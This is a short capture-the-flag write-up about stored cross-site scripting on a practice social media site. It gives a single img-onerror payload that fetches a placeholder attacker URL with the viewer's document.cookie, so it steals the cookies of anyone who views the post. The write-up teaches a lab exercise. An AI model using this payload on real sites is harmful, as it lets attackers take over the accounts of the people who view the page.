# Write up for Freedom Posting.

## Overview

For this challenge, we are doing some Cross Site Scripting (XSS) to get another user's cookies.

### Flag 1

We have a social media site where we can make a post with a title and a body of text. Experimenting, we find that it is vulnerable to html injection, 
but script tags and javascript are somehow escaped, even when we use escape sequences like ```<&#115;cript>...<&#47;&#115;cript>``` to avoid detection.

However, it is vulnerable to image onerror javascript injection. So, we can create a javascript payload that makes a web request to a website we control
(such as a service like beeceptor.com) that includes the user's cookies in the path of the url. We then put that javascript in an ```<img>```
tag as the onerror and have the source be something invalid (like ```0```). This will cause it to always execute the onerror code, and get us the cookies of 
any user that looks at this post. Such an injection is below.

```<img src=0 onerror=fetch("http://yourwebsite.com/"+document.cookie)>```

This gets us the flag.





